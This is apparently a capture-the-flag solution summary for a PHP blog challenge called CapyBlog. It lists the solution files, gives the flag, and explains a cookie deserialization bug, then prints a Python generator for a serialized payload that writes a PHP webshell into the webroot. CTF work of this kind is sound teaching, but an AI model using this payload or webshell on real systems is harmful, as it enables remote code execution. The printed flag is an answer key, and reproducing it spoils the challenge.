# CapyBlog — local artifacts

```text
solution/
├─ flag.txt                          KubSTU(capybl0g_php_d3s3r1al1zat10n)
├─ exploit.sh                        end-to-end reproducer (race-the-cleanup-script
│                                    file write of a webshell + cmd execution)
└─ artifacts/
   ├─ index.html                     /
   ├─ robots.txt                     `Disallow: /backup/` — points at the leak
   ├─ login.php.html / register.php.html
   ├─ backup_www.zip                 /backup/www.zip — leaked source archive (~7.8 MB)
   └─ backup_www_extracted/          unpacked source:
       ├─ auth.php
       ├─ classes.php                 ←— Logger / FileHandler / Cache / User gadgets
       ├─ config.php
       ├─ utils.php                   ←— `get_theme()` calls @unserialize() on the
       │                                  base64-decoded `theme` cookie
       ├─ login.php / register.php
       └─ data/                      sample users.json / comments.json + post pngs
```

## TL;DR vulnerability

`utils.php::get_theme()` deserializes the base64-decoded `theme` cookie. `classes.php`
defines `Logger` whose `__destruct()` is `@file_put_contents($logFile, $message, FILE_APPEND)`
— arbitrary file write at script shutdown. Drop a PHP webshell into `/var/www/html/p.php`
and race the host's cleanup script (which deletes new files in webroot within ~1 s) to
exec `cat /var/www/html/data/flag.txt`.

Payload generator (Python):

```python
import base64
def s(v): return f's:{len(v.encode())}:"{v}";'
shell = '<?php system($_GET["c"]); ?>'
print(base64.b64encode(
    f'O:6:"Logger":2:{{{s("logFile")}{s("/var/www/html/p.php")}{s("message")}{s(shell)}}}'.encode()
).decode())
```
